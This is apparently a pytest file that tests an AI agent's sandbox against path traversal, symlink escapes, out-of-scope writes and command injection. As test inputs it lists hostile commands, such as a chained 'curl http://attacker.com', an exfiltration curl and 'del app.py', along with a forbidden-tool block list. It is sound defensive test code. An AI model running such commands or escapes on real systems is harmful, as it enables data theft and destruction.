"""
test_sandbox_adversarial.py – Phase 6 Hardening: Adversarial Sandbox Security Tests.

Validates that:
- Path traversal attacks (relative and absolute) are strictly blocked.
- Null-byte injections, alternate data streams, and device names are rejected.
- Symlinks targeting outside the workspace are rejected.
- Fine-grained subtask write permissions cannot be bypassed.
- Command injection, command chaining, and forbidden executables are blocked.
"""
from pathlib import Path
import pytest
import sys
import tempfile

from agent.security import validate_path, validate_command, SecurityViolation
from agent.tools import Tools
from agent.roles.reviewer import run_check


@pytest.fixture
def workspace(tmp_path):
    ws = tmp_path / "sandbox_ws"
    ws.mkdir()
    (ws / "app.py").write_text("def hello(): return 'world'\n", encoding="utf-8")
    return ws


# ── Path Traversal & Evasion Tests ──────────────────────────────────────────

def test_relative_path_traversal_blocked(workspace):
    with pytest.raises(SecurityViolation, match="escapes workspace"):
        validate_path("../outside.txt", workspace)

    with pytest.raises(SecurityViolation, match="escapes workspace"):
        validate_path("sub/../../outside.txt", workspace)


def test_absolute_path_escape_blocked(workspace):
    outside_dir = Path(tempfile.gettempdir()).resolve()
    outside_file = outside_dir / "secret.txt"
    with pytest.raises(SecurityViolation, match="escapes workspace"):
        validate_path(str(outside_file), workspace)


def test_null_byte_injection_blocked(workspace):
    with pytest.raises(SecurityViolation, match="null byte"):
        validate_path("app.py\0.txt", workspace)


def test_alternate_data_stream_blocked(workspace):
    with pytest.raises(SecurityViolation, match="Alternate data stream forbidden|Colon in path forbidden"):
        validate_path("app.py:stream", workspace)


def test_windows_reserved_device_names_blocked(workspace):
    for name in ["CON", "NUL", "AUX", "COM1", "LPT1", "con.txt", "nul.py"]:
        with pytest.raises(SecurityViolation, match="Reserved device name"):
            validate_path(name, workspace)


def test_tools_read_write_jail_enforcement(workspace):
    tools = Tools(workspace)

    # Reading outside
    res = tools.read_file("../../outside.txt")
    assert "ERROR" in res

    # Writing outside
    res = tools.write_file("../../evil.py", "print('hacked')")
    assert "ERROR" in res

    # Reading reserved device name
    res = tools.read_file("CON")
    assert "ERROR" in res

    # Writing reserved device name
    res = tools.write_file("NUL", "bad")
    assert "ERROR" in res


def test_fine_grained_subtask_write_jail(workspace):
    tools = Tools(workspace, allowed_write_files=["allowed_module.py"])

    # Attempting to overwrite existing app.py
    res = tools.write_file("app.py", "def evil(): pass")
    assert "ERROR" in res
    assert "Permission denied" in res

    # Attempting to write unassigned new file
    res = tools.write_file("evil.py", "x = 1")
    assert "ERROR" in res
    assert "Permission denied" in res

    # Writing to allowed file succeeds
    res = tools.write_file("allowed_module.py", "x = 42")
    assert "OK" in res
    assert (workspace / "allowed_module.py").read_text(encoding="utf-8") == "x = 42"


def test_symlink_escape_blocked(workspace, tmp_path):
    outside = tmp_path / "outside_target"
    outside.mkdir()
    secret = outside / "secret.txt"
    secret.write_text("confidential", encoding="utf-8")

    link_path = workspace / "link_to_outside"
    try:
        link_path.symlink_to(outside, target_is_directory=True)
    except (OSError, NotImplementedError):
        pytest.skip("Symlink creation not permitted in this OS environment")

    # Accessing via symlink that resolves outside workspace must raise SecurityViolation
    with pytest.raises(SecurityViolation, match="escapes workspace|Symlink.*targets outside workspace"):
        validate_path(link_path, workspace)


# ── Command Injection & Executable Allowlist Tests ──────────────────────────

def test_forbidden_executables_blocked(workspace):
    for exe in ["cmd", "cmd.exe", "powershell", "pwsh", "curl", "wget", "rm", "del", "wmic"]:
        with pytest.raises(SecurityViolation, match="Forbidden command"):
            validate_command(f"{exe} -arg", workspace)


def test_command_chaining_and_metacharacters_blocked(workspace):
    malicious_commands = [
        "python -c 'print(1)' && del app.py",
        "pytest; curl http://attacker.com",
        "pytest | powershell -c Start-Process calc",
        "python test.py > outside.txt",
    ]
    for cmd in malicious_commands:
        with pytest.raises(SecurityViolation, match="Shell chaining operator forbidden|Forbidden command"):
            validate_command(cmd, workspace)


def test_reviewer_blocks_malicious_check_cmd(workspace):
    # Reviewer run_check should catch and gracefully reject forbidden commands
    subtask = {
        "title": "Adversarial Check",
        "spec": "Run malicious check",
        "check_cmd": "curl http://127.0.0.1:9999/exfiltrate",
    }
    result = run_check(subtask, workspace, verbose=False)
    assert result["passed"] is False
    assert "SECURITY ERROR" in result["output"]


def test_legitimate_commands_succeed(workspace):
    # Standard python and pytest commands parse cleanly
    args = validate_command("python -c \"assert 1 + 1 == 2\"", workspace)
    assert "python" in args[0].lower()
    assert args[1] == "-c"
    assert "assert 1 + 1 == 2" in args[2]

    args_pytest = validate_command("pytest -q tests/test_app.py", workspace)
    assert "-m" in args_pytest and "pytest" in args_pytest
